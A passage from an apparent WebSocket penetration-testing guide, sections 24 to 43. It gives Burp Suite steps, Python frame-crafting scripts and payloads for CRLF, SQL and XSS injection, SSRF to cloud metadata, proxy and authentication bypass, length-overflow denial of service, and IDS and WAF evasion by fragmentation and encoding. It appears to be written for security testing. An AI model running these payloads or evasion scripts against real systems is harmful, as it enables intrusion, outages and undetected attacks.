Host: attacker.com
Host: target.com:8080
Host: target.com extra

Try injecting into the Upgrade path:

GET /ws?param=value%0d%0aX-Injected:evil HTTP/1.1

Send each payload → Check if the 101 response contains your injected header → Check if server processes the injected header as real
Also try null byte injection in header values:

X-Custom: value%00X-Admin:true
🔴 Vulnerable When:

CRLF injection (%0d%0a) in any header value results in the injected header appearing in the response
Host header injection causes the server to redirect or process requests differently
Injected X-Role: admin header is actually processed and gives elevated privileges
Null byte in header value causes the server to truncate and misparse subsequent headers

Severity: HIGH

24. WebSocket Protocol Downgrade Attack
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Right-click → Send to Repeater
Change the Sec-WebSocket-Version header from 13 to older versions:

Sec-WebSocket-Version: 8
Sec-WebSocket-Version: 7
Sec-WebSocket-Version: 6
Sec-WebSocket-Version: 0
Click Send for each → Check if server accepts the older version with 101

Try changing the Upgrade header value:

Upgrade: websocket
→ change to:
Upgrade: WebSocket
Upgrade: WEBSOCKET
Upgrade: ws

Try downgrading the HTTP version in the Upgrade request — in Repeater, there's a version selector → Change from HTTP/1.1 to HTTP/1.0 → Send → Check response
Try changing Connection: Upgrade to:

Connection: keep-alive
Connection: close
See if server still upgrades despite wrong Connection header

In Burp Repeater, try sending the WebSocket Upgrade request but with HTTP/2 format → Check if the server mixes up protocol versions
If the server returns Sec-WebSocket-Version: 8 (indicating it supports older versions), research what known vulnerabilities exist in WebSocket version 8 vs 13
Try using a downgraded path — if the app has /ws/v2, try /ws/v1 which might run older, less secure code

🔴 Vulnerable When:

Server accepts Sec-WebSocket-Version: 8 or lower (older versions have known security weaknesses including lack of masking requirements)
Server accepts WebSocket upgrade over HTTP/1.0 which can't properly handle upgrade mechanism
Server processes requests with Connection: keep-alive instead of Connection: Upgrade (improper header validation)
Older API path (/ws/v1) exists and lacks security controls present in newer paths

Severity: MEDIUM to HIGH

25. WebSocket Masking Key Manipulation
Steps:

Understand the concept: Per RFC 6455, all client-to-server WebSocket frames MUST be masked. Servers should reject unmasked frames from clients.
Open Burp Suite → Proxy → WebSockets history → Find a client-to-server message → Right-click → Send to Repeater
Use Python routed through Burp to send an unmasked frame (which violates RFC):

pythonimport socket
import hashlib
import base64

# Manual WebSocket frame construction - unmasked
# Normal frame with masking bit set to 0 (should be 1 for client-to-server)
def create_unmasked_frame(payload):
    payload_bytes = payload.encode()
    length = len(payload_bytes)
    # FIN=1, opcode=1 (text), MASK=0 (violation), length
    header = bytes([0x81, length])  # MASK bit is 0
    return header + payload_bytes

ws_socket = socket.create_connection(("target.com", 443))
# ... complete TLS and handshake setup ...
ws_socket.send(create_unmasked_frame('{"action":"getProfile"}'))
response = ws_socket.recv(4096)
print(response)

Check if the server:


Closes the connection with code 1002 (protocol error) — correct behavior
Accepts and processes the unmasked frame — vulnerable behavior


Try sending a frame with a known/predictable masking key (e.g., all zeros: 00 00 00 00) → Check if server processes it
Try sending a frame with the masking key repeated as the payload XOR'd with the same key to effectively send a chosen plaintext
Also test server-to-client messages — RFC says server must not mask server-to-client frames → In WebSockets history, if you see server messages that look masked, that's a violation

🔴 Vulnerable When:

Server accepts and processes unmasked client-to-server frames without closing the connection with code 1002
Server accepts frames with all-zero masking key (predictable masking is exploitable in certain scenarios)
Server-to-client frames are masked (RFC violation — may indicate custom implementation with weaknesses)

Severity: MEDIUM

26. WebSocket Close Frame Abuse for Connection Reset
Steps:

Open Burp Suite → Proxy → WebSockets history → Establish a WebSocket connection → Find your session in the history
In Repeater, with an active WebSocket connection, send a close frame message → In Burp WebSocket Repeater, there may be a close option, or use Python:

pythonimport websocket
ws = websocket.create_connection("wss://target.com/ws",
    header=["Cookie: session=YOUR_SESSION"])
ws.send('{"action":"subscribe","channel":"notifications"}')
# Now send close frame with reason
ws.close(1000, "Normal closure")
# Try to send another message after close
ws.send('{"action":"getProfile"}')
print(ws.recv())

After sending close frame, immediately send another message before the server processes the close → Check if the post-close message is processed
Try sending a close frame with unusual status codes:

1001 - Going Away
1002 - Protocol Error
1003 - Unsupported Data
1007 - Invalid frame payload data
1008 - Policy Violation
1009 - Message too big
1010 - Mandatory extension missing
1011 - Internal server error
9999 - Reserved/invalid code
Check if unusual close codes cause server errors or expose error details

Try sending a close frame with a very long reason string (close frames can have a reason payload):

pythonws.close(1000, "A" * 10000)  # Max should be 125 bytes - this violates it

After connection closes, try to reuse the same TCP connection for another WebSocket upgrade → Check if server allows WebSocket re-upgrade on same connection

🔴 Vulnerable When:

Messages sent after a close frame are still processed by the server
Server crashes or returns 500 when receiving close frame with invalid status code (e.g., 9999)
Close frame with >125 byte reason causes server error
Server exposes internal error details in close frame reason string (Internal server error: NullPointerException at line 42)

Severity: MEDIUM

27. WebSocket Continuation Frame Manipulation
Steps:

Open Burp Suite — to test continuation frames you need to work at the raw frame level → Use Python routed through Burp:

pythonimport websocket
import struct

ws = websocket.create_connection("wss://target.com/ws",
    http_proxy_host="127.0.0.1",
    http_proxy_port=8080,
    header=["Cookie: session=YOUR_SESSION"])

# Send a continuation frame (opcode 0x0) WITHOUT a preceding fragmented start frame
# This violates RFC - server should reject it
sock = ws.sock
# FIN=1, opcode=0 (continuation - but no start frame was sent first)
frame = struct.pack('!BB', 0x80, 0x05) + b'hello'  # unmasked for simplicity
sock.send(frame)
print(sock.recv(4096))

Check if the server:


Closes with 1002 (protocol error) — correct
Accepts and processes the orphan continuation frame — vulnerable


Try sending a fragmented message that never completes — send first fragment (FIN=0) and then never send the final fragment (FIN=1) → Wait → Check if server times out and closes, or hangs indefinitely
Try sending continuation frames with wrong opcodes:


Start frame: opcode=1 (text)
Continuation: opcode=2 (binary) instead of 0 (continuation)


Try injecting a control frame (ping, opcode 9) between continuation frames — RFC says this IS allowed — then check if the server properly handles it and completes the fragmented message
Send continuation frame with a payload that when combined with start frame creates an injection:


Start frame: {"action":"get
Continuation: User","id":"1' OR '1'='1"}

🔴 Vulnerable When:

Server accepts a continuation frame (opcode 0) without a preceding non-FIN start frame
Server hangs indefinitely waiting for the end of an incomplete fragmented message (DoS)
Server mishandles continuation frames with wrong opcode instead of closing connection with 1002
Combined fragmented payload that contains injection is processed without full-payload validation

Severity: MEDIUM to HIGH

28. WebSocket Control Frame Injection Attack
Steps:

Control frames in WebSocket are: Ping (0x9), Pong (0xA), Close (0x8) — RFC 6455 says control frames MUST NOT be fragmented and MUST be ≤125 bytes payload
Use Python through Burp proxy to send malformed control frames:

pythonimport websocket, struct

ws = websocket.create_connection("wss://target.com/ws",
    http_proxy_host="127.0.0.1", http_proxy_port=8080,
    header=["Cookie: session=YOUR_SESSION"])

# Send a FRAGMENTED ping (FIN=0, opcode=0x9) - RFC violation
# FIN=0 means not final, opcode=9 is ping
frame = struct.pack('!BB', 0x09, 126) + struct.pack('!H', 200) + b'A' * 200
# This is a ping with >125 bytes payload AND marked as fragmented - double violation
ws.sock.send(frame)
response = ws.sock.recv(4096)
print("Server response:", response)

In Burp → Proxy → WebSockets history → Find any ping message (opcode 9) if visible → Right-click → Send to Repeater → Send it rapidly 100 times using Intruder (null payloads, 100 count) → Check if server starts dropping responses
Try sending a ping with injection payload:

pythonws.ping('{"action":"getAdminUsers"}')  # Ping payload with JSON command
Check if the server somehow executes the ping payload as a command

Try sending pong without ping (unsolicited pong — RFC says this is allowed as a keepalive but check server behavior):

pythonws.pong(b'unsolicited pong')

Check if sending a close frame (control frame) from the middle of a fragmented data message causes the server to close before processing the full data

🔴 Vulnerable When:

Server accepts fragmented ping frames (opcode 9 with FIN=0) instead of closing with 1002
Server accepts ping frames with payload >125 bytes instead of closing with 1002
Rapid control frame injection causes server slowdown or crash (DoS)
Ping payload is somehow parsed/executed as a command by the server

Severity: MEDIUM

29. WebSocket Text Frame Encoding Manipulation
Steps:

Open Burp Suite → Proxy → WebSockets history → Find a text message → Right-click → Send to Repeater
Take a normal message like:

json{"action":"getUser","id":1}

Try encoding the message in different ways and send each one:

URL Encoding:
%7B%22action%22%3A%22getUser%22%2C%22id%22%3A1%7D
HTML Entity Encoding:
&#x7B;&#x22;action&#x22;&#x3A;&#x22;getUser&#x22;&#x7D;
Unicode Escape:
\u007B\u0022action\u0022\u003A\u0022getUser\u0022\u007D
Double URL Encoding:
%257B%2522action%2522%253A%2522getUser%2522%257D

Check if any encoding is accepted and processed as valid JSON
Also try sending non-UTF-8 bytes in a text frame (RFC 6455 says text frames MUST be valid UTF-8):

python# Send invalid UTF-8 in a text frame
ws.sock.send(b'\x81\x85' + b'\x00\x00\x00\x00' + b'\xff\xfe\xfd\xfc\xfb')
Server should close with code 1007 (invalid frame payload data) if it validates UTF-8

Try BOM (Byte Order Mark) at the start of message:

\xef\xbb\xbf{"action":"getUser"}

Try mixed encoding — part of the JSON is encoded, part is plain:

{"action":"\u0067\u0065\u0074\u0055\u0073\u0065\u0072","id":1}
(This spells "getUser" in Unicode escapes) — does server process it?
🔴 Vulnerable When:

Server accepts URL-encoded or HTML-entity-encoded WebSocket messages and processes them (bypasses WAF/input validation that expects plain JSON)
Server accepts invalid UTF-8 bytes in text frames without closing with 1007
Unicode-escaped values in JSON bypass input filters (e.g., \u003cscript\u003e bypasses XSS filter checking for <script>)
BOM characters cause the JSON parser to behave unexpectedly

Severity: MEDIUM to HIGH

30. WebSocket Reserved Bit Manipulation
Steps:

RFC 6455 defines 3 reserved bits (RSV1, RSV2, RSV3) in the WebSocket frame header. These MUST be 0 unless an extension has been negotiated that defines their meaning.
Use Python through Burp to send frames with reserved bits set:

pythonimport websocket, struct

ws = websocket.create_connection("wss://target.com/ws",
    http_proxy_host="127.0.0.1", http_proxy_port=8080,
    header=["Cookie: session=YOUR_SESSION"])

payload = b'{"action":"getProfile"}'
masked_payload = bytes([b ^ 0x37 for b in payload])  # Simple mask

# Normal frame: 0x81 = FIN=1, RSV1=0, RSV2=0, RSV3=0, opcode=1
# RSV1 set: 0xC1 = FIN=1, RSV1=1, RSV2=0, RSV3=0, opcode=1
# RSV2 set: 0xA1 = FIN=1, RSV1=0, RSV2=1, RSV3=0, opcode=1
# All RSV set: 0xF1 = FIN=1, RSV1=1, RSV2=1, RSV3=1, opcode=1

for first_byte in [0xC1, 0xA1, 0x91, 0xF1]:
    frame = bytes([first_byte, 0x80 | len(payload)]) + b'\x37\x37\x37\x37' + masked_payload
    ws.sock.send(frame)
    try:
        response = ws.sock.recv(4096)
        print(f"Byte {hex(first_byte)}: Server responded:", response[:100])
    except:
        print(f"Byte {hex(first_byte)}: Connection closed")

For each RSV bit combination, check if server:


Closes with 1002 (correct — no extension negotiated these bits)
Accepts the frame and processes it (vulnerable)


Note: If permessage-deflate extension is active, RSV1=1 is valid (means compressed). Try RSV2 and RSV3 which are still undefined.
Send frames with all RSV bits set plus a valid compression extension negotiated → Check if server confuses which RSV bits relate to which extensions

🔴 Vulnerable When:

Server accepts frames with RSV bits set when no extension has been negotiated for those bits (should close with 1002)
Server processes the message normally instead of rejecting — indicates the WebSocket library is not RFC-compliant
Different RSV bit combinations produce different server behavior (information about server internals)

Severity: MEDIUM

31. WebSocket Payload Length Field Overflow
Steps:

In WebSocket framing, the payload length is encoded as: 7 bits (0-125), or 7+16 bits (126 = next 2 bytes are length), or 7+64 bits (127 = next 8 bytes are length)
Use Python through Burp to send frames with mismatched declared vs actual length:

pythonimport websocket, struct, socket

ws = websocket.create_connection("wss://target.com/ws",
    http_proxy_host="127.0.0.1", http_proxy_port=8080,
    header=["Cookie: session=YOUR_SESSION"])

# Claim payload is 65535 bytes (2-byte extended length)
# But only send 5 bytes of actual payload
claimed_length = 65535
actual_payload = b'hello'
mask_key = b'\x37\x37\x37\x37'
masked = bytes([b ^ 0x37 for b in actual_payload])

frame = bytes([0x81])  # FIN+text
frame += bytes([0x80 | 126])  # MASK bit + extended length indicator
frame += struct.pack('!H', claimed_length)  # Claim 65535 bytes
frame += mask_key
frame += masked  # Only 5 actual bytes

ws.sock.send(frame)
try:
    response = ws.sock.recv(4096)
    print("Response:", response)
except Exception as e:
    print("Server closed/errored:", e)

Try declaring a 64-bit max length but send only small payload:

python# Payload length = 2^63 (maximum 64-bit value)
frame += struct.pack('!Q', 0x7FFFFFFFFFFFFFFF)  # 9.2 exabytes claimed

Try integer overflow — for 16-bit length field, try 65536 (overflow to 0) or 65535 + 1
Try declaring length as 0 but sending actual data after the mask key
Check server behavior for each — look for crashes, timeouts, or unexpected responses

🔴 Vulnerable When:

Server crashes or hangs when declared length is much larger than actual payload (trying to read more bytes than exist = hangs)
Server accepts a frame claiming 9 exabytes of data without immediately rejecting it
Integer overflow in length field causes server to read wrong amount of data and process garbage as valid message
Server allocates memory based on declared length (not actual) — memory exhaustion DoS

Severity: HIGH

32. WebSocket Handshake Parameter Injection
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade GET request → Right-click → Send to Repeater
The Upgrade request typically looks like:

GET /ws?token=abc123&version=1 HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

Try SQL injection in query parameters:

GET /ws?token=abc123' OR '1'='1 HTTP/1.1
GET /ws?userId=1 UNION SELECT password FROM users--

Try XSS in query parameters:

GET /ws?callback=<script>alert(1)</script>
GET /ws?origin=javascript:alert(1)

Try path traversal:

GET /ws/../admin/ws
GET /%2e%2e/admin/ws

Try parameter pollution — send the same parameter twice:

GET /ws?token=INVALID&token=VALID_TOKEN
GET /ws?userId=1&userId=2

Try SSRF via parameter:

GET /ws?url=http://internal-server:8080
GET /ws?host=169.254.169.254  (AWS metadata)

In Burp Intruder, mark each query parameter value as a payload position → Use Fuzzing - full payload list from Burp's built-in lists → Run and check for any 500 errors or interesting responses

🔴 Vulnerable When:

SQL injection in query parameters returns database errors or different behavior
Path traversal in URL path allows accessing different WebSocket endpoints than intended
Parameter pollution with userId=1&userId=2 causes server to use either value inconsistently
SSRF parameter causes server to make internal requests (confirmed via Burp Collaborator callback)

Severity: HIGH to CRITICAL

33. WebSocket Sec-WebSocket-Key Predictability
Steps:

Open Burp Suite → Proxy → HTTP history → Find multiple WebSocket Upgrade requests (you need several) → Note the Sec-WebSocket-Key values in each:

Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==

Copy all Sec-WebSocket-Key values you've captured → Go to Decoder tab → Decode each from Base64 → Check if the decoded 16-byte values look random or sequential/predictable
Try sending an Upgrade request with a known/simple key:

Sec-WebSocket-Key: AAAAAAAAAAAAAAAAAAAAAA==
Sec-WebSocket-Key: 0000000000000000
Check if server accepts any key format

Verify the server computes Sec-WebSocket-Accept correctly → The server MUST return:

Base64(SHA1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
Go to Burp Decoder → Enter your key + magic string → Hash as SHA1 → Encode as Base64 → Compare with what server returned

Try sending the same Sec-WebSocket-Key twice in two simultaneous connections → See if server confuses the two connections
Try sending no Sec-WebSocket-Key header → Server should reject with 400 Bad Request
Try sending an invalid Base64 key (not 16 bytes when decoded):

Sec-WebSocket-Key: shortkey==
Sec-WebSocket-Key: this_is_not_base64!!!
🔴 Vulnerable When:

Server accepts any value for Sec-WebSocket-Key including empty, short, or non-Base64 values
Server computes incorrect Sec-WebSocket-Accept (means custom/broken WebSocket implementation)
Missing Sec-WebSocket-Key header doesn't cause 400 rejection
Key values are sequential or predictable patterns (enables session prediction attacks)

Severity: MEDIUM

34. WebSocket Sec-WebSocket-Version Downgrade
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Right-click → Send to Repeater
Current standard version is 13. Try each older version:

Sec-WebSocket-Version: 13  (current - baseline)
Sec-WebSocket-Version: 12
Sec-WebSocket-Version: 11
Sec-WebSocket-Version: 10
Sec-WebSocket-Version: 9
Sec-WebSocket-Version: 8
Sec-WebSocket-Version: 7
Sec-WebSocket-Version: 6
Sec-WebSocket-Version: 1
Sec-WebSocket-Version: 0
Click Send for each → Note which versions get 101 vs 400/426

If server returns 426 Upgrade Required for an unsupported version, check the Sec-WebSocket-Version header in the response — it shows what versions the server supports
For each accepted version, check what security differences exist:


Versions before 8: No masking requirement
Versions before 13: Different handshake process


Try sending multiple version values:

Sec-WebSocket-Version: 13, 8, 7
Check which version the server negotiates

Try invalid version numbers:

Sec-WebSocket-Version: 999
Sec-WebSocket-Version: -1
Sec-WebSocket-Version: abc
Sec-WebSocket-Version: 13.5

If any old version is accepted, connect using that version and check if masking is required (older versions didn't require client-to-server masking)

🔴 Vulnerable When:

Server accepts Sec-WebSocket-Version: 8 or older — these lack proper masking requirements making data easier to inject or intercept
Server accepts invalid version numbers without error
Server accepts Sec-WebSocket-Version: 13, 8 and negotiates version 8 (downgrade attack succeeds)

Severity: MEDIUM

35. WebSocket Sec-WebSocket-Protocol Injection
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Note the Sec-WebSocket-Protocol header value (e.g., chat)
Right-click → Send to Repeater → Try injecting characters into the protocol value:

CRLF injection:
Sec-WebSocket-Protocol: chat\r\nX-Admin: true
Sec-WebSocket-Protocol: chat\r\nCookie: session=ATTACKER_VALUE
In Burp, use URL-encoded CRLF: chat%0d%0aX-Admin:%20true
Special characters:
Sec-WebSocket-Protocol: chat<script>alert(1)</script>
Sec-WebSocket-Protocol: chat'; DROP TABLE sessions;--
Sec-WebSocket-Protocol: chat, admin, debug
Sec-WebSocket-Protocol: ../admin

Check the 101 response headers — does your injected content appear in the response headers?
Check if adding , admin to the protocol list causes the server to negotiate the admin subprotocol:

Sec-WebSocket-Protocol: chat, admin
If 101 response shows Sec-WebSocket-Protocol: admin, the injection worked

Try null byte injection:

Sec-WebSocket-Protocol: chat%00admin

Try a very long protocol name (10,000 characters) to check for buffer overflow
In Burp Intruder, mark the protocol value as position → Use payload list of special chars from Burp's built-in Fuzzing - special characters list → Run and check for server errors

🔴 Vulnerable When:

CRLF injection (%0d%0a) in protocol header causes additional headers to appear in the 101 response
Adding , admin to protocol list results in server negotiating admin protocol with privileged access
Very long protocol name causes server crash or 500 error
Injected protocol value is reflected unsanitized in server's response (reflected injection)

Severity: HIGH

36. WebSocket Sec-WebSocket-Extensions Manipulation
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Note the Sec-WebSocket-Extensions header
Right-click → Send to Repeater → Try injecting into extension parameters:

Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=15\r\nX-Admin: true
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits="15'; DROP TABLE sessions;--"
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=<script>alert(1)</script>

Try requesting multiple extensions at once:

Sec-WebSocket-Extensions: permessage-deflate, x-custom-extension, debug-mode
Check which ones server accepts in the 101 response

Try removing the extension when it was originally present → Connect → Check if messages are now uncompressed and what impact that has
Try setting compression window bits to extreme values:

Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=0
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=16
Sec-WebSocket-Extensions: permessage-deflate; server_max_window_bits=100

Try boolean parameter injection — some extensions have boolean params:

Sec-WebSocket-Extensions: permessage-deflate; server_no_context_takeover; client_no_context_takeover; evil_param

Try sending no extension header when the server normally expects one → Check if server behavior changes

🔴 Vulnerable When:

CRLF injection in extension parameters adds unauthorized headers to the 101 response
SQL/script injection in extension parameter values causes server error exposing DB details
Server accepts invented extension names like debug-mode and enables debug functionality
Extreme compression window values cause excessive CPU/memory usage (DoS)

Severity: MEDIUM to HIGH

37. WebSocket Proxy Authentication Bypass
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Check if there's a Proxy-Authorization header in the request
Right-click Upgrade request → Send to Repeater → Try removing the Proxy-Authorization header completely → Click Send → Does the WebSocket still connect through the proxy?
Try changing the Proxy-Authorization value to invalid credentials:

Proxy-Authorization: Basic aW52YWxpZDppbnZhbGlk  (invalid:invalid in Base64)

Try adding proxy bypass headers:

X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
These may trick the proxy into thinking you're coming from localhost (trusted)

Try HTTP CONNECT tunnel bypass — if the proxy uses CONNECT method for tunneling:

CONNECT target.com:443 HTTP/1.1
Host: target.com:443
Then try WebSocket upgrade through the tunnel without proxy auth

In Burp → User Options → Upstream Proxy → Configure Burp to route through the target's proxy → Send requests without proper proxy auth and see if they go through
Try using different proxy-related headers to confuse the proxy:

Proxy-Connection: keep-alive
Proxy-Authorization: Basic 
Proxy-Authorization: Negotiate
Proxy-Authorization: NTLM
🔴 Vulnerable When:

WebSocket Upgrade goes through with no Proxy-Authorization header at all
Invalid credentials in Proxy-Authorization are accepted
Adding X-Forwarded-For: 127.0.0.1 bypasses proxy authentication requirement
Proxy uses HTTP CONNECT without validating credentials before allowing tunnel

Severity: HIGH

38. WebSocket Reverse Proxy Misconfiguration
Steps:

Open Burp Suite → Proxy → HTTP history → Find the WebSocket Upgrade request → Look at the Host header → Also note the IP address if visible
Right-click → Send to Repeater → Try changing the Host header:

Host: internal-backend-server
Host: 127.0.0.1
Host: 10.0.0.1
Host: localhost
Host: backend.internal
Click Send → Does the connection route differently?

Try accessing the WebSocket endpoint directly by IP (bypassing the reverse proxy):


Find the backend server's IP via DNS lookup, certificate transparency logs, or Shodan
In Repeater, change Host to the direct IP: Host: 1.2.3.4
Or change the target in Repeater to directly connect to the backend IP


Look for path confusion — try accessing the WebSocket via different paths that might hit different backend servers:

GET /ws HTTP/1.1  → normal path
GET //ws HTTP/1.1  → double slash
GET /ws/ HTTP/1.1  → trailing slash
GET /.ws HTTP/1.1  → dot prefix

Try adding headers that reverse proxies forward to backend:

X-Forwarded-Host: internal-backend
X-Real-IP: 127.0.0.1
X-Forwarded-Server: internal.target.com

Check if the reverse proxy strips security headers — compare headers in the Upgrade request with what you'd expect to reach the backend (WAF rules, rate limits applied at proxy level might be bypassed at backend)
Use Burp Collaborator to check if the backend server makes outbound requests that expose its real IP

🔴 Vulnerable When:

Changing Host: 127.0.0.1 routes the WebSocket to the backend server directly, bypassing WAF/auth at the reverse proxy level
Backend server is accessible directly by IP with no authentication (reverse proxy was the only auth layer)
Path manipulation (//ws, /ws/../ws) bypasses security rules applied at the reverse proxy
X-Forwarded-Host header causes reverse proxy to route to internal backend servers (SSRF)

Severity: HIGH to CRITICAL

39. WebSocket Load Balancer Session Persistence
Steps:

Open Burp Suite → Proxy → HTTP history → Find multiple WebSocket Upgrade requests → Check for sticky session cookies or headers like:

Cookie: SERVERID=server1
Cookie: AWSALB=abc123...
X-Load-Balancer: server-2

Right-click Upgrade request → Send to Repeater → Remove the sticky session cookie → Click Send → Check if you still connect (but possibly to a different backend)
Establish a WebSocket connection → Perform a stateful action (e.g., join a room, set a preference, subscribe to a feed) → Now break the sticky session by removing/changing the SERVERID cookie → Send another message → Check if your state is preserved or lost
In Burp Intruder → Send multiple Upgrade requests with different SERVERID values:

Cookie: SERVERID=server1
Cookie: SERVERID=server2
Cookie: SERVERID=server3
Check each response to see if different backends have different security configs

Try sending the same session token on two different WebSocket connections simultaneously → If load balancer routes them to different servers, check if both can use the same token
Try exploiting state inconsistency — authenticate on one server, then force connection to another server (by changing SERVERID) before session is replicated → Check if you're unauthenticated on the second server with the same session
Look for backend server fingerprinting differences in responses from different servers (different response times, headers, or error messages)

🔴 Vulnerable When:

Removing sticky session cookie causes you to hit a backend server that has different (weaker) security rules
State established on server1 (authenticated, subscribed) is lost when routed to server2 — auth state not replicated
Different backend servers have different software versions/configs — older one may have known vulnerabilities
Same session token works on all backend servers simultaneously (no session invalidation on one affects others)

Severity: MEDIUM to HIGH

40. WebSocket CDN WebSocket Support Vulnerability
Steps:

Open Burp Suite → Proxy → HTTP history → Find the WebSocket Upgrade request → Look at the response headers for CDN fingerprints:

Server: CloudFront
CF-Cache-Status: MISS  (Cloudflare)
Via: 1.1 varnish
X-Cache: Hit from CloudFront

Try accessing the WebSocket endpoint through the CDN URL vs directly:


CDN: wss://cdn.target.com/ws
Direct: wss://target.com/ws
Compare what security headers are applied in each path


In Burp Repeater, try sending WebSocket upgrade to the CDN hostname vs origin hostname → Check if CDN correctly proxies WebSocket or strips important headers
Check if the CDN caches WebSocket upgrade responses — send the same upgrade request twice and check if second response is suspiciously fast (cached 101 response would be a serious issue)
Try sending unusual WebSocket frames through the CDN — some CDNs inspect or modify WebSocket frames → Send a binary frame and check if it arrives modified at the server
Try accessing the origin server directly (bypass CDN) if you can find the origin IP:


Check DNS history on SecurityTrails/ViewDNS
Check SSL certificates on crt.sh for origin server names
Try connecting directly to found origin IP in Burp Repeater


Check if CDN's WebSocket timeout is different from what the app expects → CDN might close idle WebSockets after 60 seconds while app expects persistence

🔴 Vulnerable When:

CDN doesn't properly proxy WebSocket connections, causing some security headers to be stripped
Direct origin server access bypasses CDN security rules (rate limiting, WAF, auth)
CDN modifies or inspects WebSocket frame content (privacy issue) — visible by sending unique data and checking if server receives it modified
Origin IP discovered and accessible directly with no authentication layer

Severity: MEDIUM to HIGH

41. WebSocket Firewall Rule Bypass
Steps:

Open Burp Suite → Proxy → HTTP history → Establish a baseline — note that the WebSocket on port 443/WSS is working normally
Try connecting to alternative ports that might bypass firewall rules:
In Repeater, change the target port:

wss://target.com:8080/ws
wss://target.com:8443/ws
wss://target.com:9443/ws
wss://target.com:3000/ws
ws://target.com:80/ws   (unencrypted on port 80)

Try tunneling WebSocket through HTTP using different paths that might not be blocked:

GET /api/ws HTTP/1.1   → instead of /ws
GET /socket HTTP/1.1
GET /realtime HTTP/1.1
GET /live HTTP/1.1

Try sending the WebSocket upgrade with HTTP/2 (some firewalls only inspect HTTP/1.1):
In Burp, go to Project Options → HTTP → Enable HTTP/2 → Try the upgrade request
Try encoding the WebSocket path to bypass firewall pattern matching:

GET /ws → GET /%77%73
GET /ws → GET /%2F%2Fws
GET /ws → GET /WS  (uppercase)

Check if WebSocket traffic can be tunneled through port 443 by masquerading as HTTPS — some firewalls only check the port, not the actual protocol
Use Burp Collaborator to test if firewall blocks outbound WebSocket connections → If collaborator receives a connection from the server, outbound WS is not blocked

🔴 Vulnerable When:

WebSocket connects on alternative ports (8080, 3000) where firewall rules are less strict
URL encoding of the path (/ws → /%77%73) bypasses firewall pattern matching that looks for literal /ws
Uppercase path (/WS) is not caught by firewall rules that only check lowercase
WebSocket on port 80 (unencrypted) is accessible even if the app claims to only support HTTPS

Severity: MEDIUM to HIGH

42. WebSocket IDS/IPS Evasion via Fragmentation
Steps:

Identify a payload that an IDS/IPS would normally block when sent in a single WebSocket message — for example an XSS payload or SQLi string
Set up Burp Suite as proxy → Use Python to send fragmented versions of the blocked payload through Burp:

pythonimport websocket, struct

ws = websocket.create_connection("wss://target.com/ws",
    http_proxy_host="127.0.0.1", http_proxy_port=8080,
    header=["Cookie: session=YOUR_SESSION"])

# Normally blocked: {"query":"' OR 1=1--"}
# Split across frames to evade IDS signature matching

# Frame 1: FIN=0 (not final), opcode=1 (text), with mask
part1 = '{"query":"\'  OR '
# Frame 2: FIN=1 (final), opcode=0 (continuation), with mask
part2 = '1=1--"}'

ws.send_frame(websocket.ABNF.create_frame(
    part1.encode(), websocket.ABNF.OPCODE_TEXT, fin=0))
ws.send_frame(websocket.ABNF.create_frame(
    part2.encode(), websocket.ABNF.OPCODE_CONT, fin=1))

print(ws.recv())

In Burp → Proxy → WebSockets history → Check if the fragments appear as separate messages or if Burp reassembles them → Also check if any IDS alerts fire (if you have access to IDS logs)
Try fragmenting the payload into many small pieces (1 character per frame):

pythonpayload = '{"query":"<script>alert(1)</script>"}'
for i, char in enumerate(payload):
    fin = 1 if i == len(payload)-1 else 0
    opcode = websocket.ABNF.OPCODE_TEXT if i == 0 else websocket.ABNF.OPCODE_CONT
    ws.send_frame(websocket.ABNF.create_frame(char.encode(), opcode, fin=fin))

Check if the server reassembles and processes the fragmented payload despite IDS not seeing it as a complete attack string
Try mixing case and encoding with fragmentation:


Fragment 1: {"q
Fragment 2: uery":"<Sc
Fragment 3: ript>alert(1)</Script>"}

🔴 Vulnerable When:

XSS or SQLi payload split across 2 frames: IDS doesn't block it but server processes reassembled message and executes the injection
Single-character fragmentation completely evades IDS while server still reassembles and processes the message
Server returns different error/response for fragmented attack vs complete attack, confirming fragmentation evades detection

Severity: HIGH

43. WebSocket WAF Bypass via Encoding
Steps:

Open Burp Suite → Proxy → WebSockets history → First, confirm what the WAF blocks: try sending obvious attack strings and note what gets blocked:

json{"action":"search","q":"<script>alert(1)</script>"}
{"action":"search","q":"' OR 1=1--"}
If WAF blocks these, you see a WAF block response

Right-click → Send to Repeater → Try encoding bypass techniques one at a time:

HTML Entity Encoding:
json{"action":"search","q":"&lt;script&gt;alert(1)&lt;/script&gt;"}
Unicode Encoding:
json{"action":"search","q":"\u003cscript\u003ealert(1)\u003c/script\u003e"}
URL Encoding:
json{"action":"search","q":"%3Cscript%3Ealert%281%29%3C%2Fscript%3E"}
Double URL Encoding:
json{"action":"search","q":"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"}
Case Variation:
json{"action":"search","q":"<ScRiPt>alert(1)</sCrIpT>"}
Null byte insertion:
json{"action":"search","q":"<scr\u0000ipt>alert(1)</script>"}

For SQL injection bypass:

json{"q":"' /*!OR*/ 1=1--"}
{"q":"'/**/OR/**/1=1--"}
{"q":"' %4fR 1=1--"}    (O = %4f)
{"q":"' OORR 1=1--"}

Try Content-Type manipulation — change from application/json to text/plain in a connected HTTP request that the WAF may inspect differently
Try JSON encoding tricks:

json{"action":"search","q":"\x3cscript\x3e"}
{"action":"\u0073earch","q":"payload"}  (action = "search" with unicode s)
🔴 Vulnerable When:

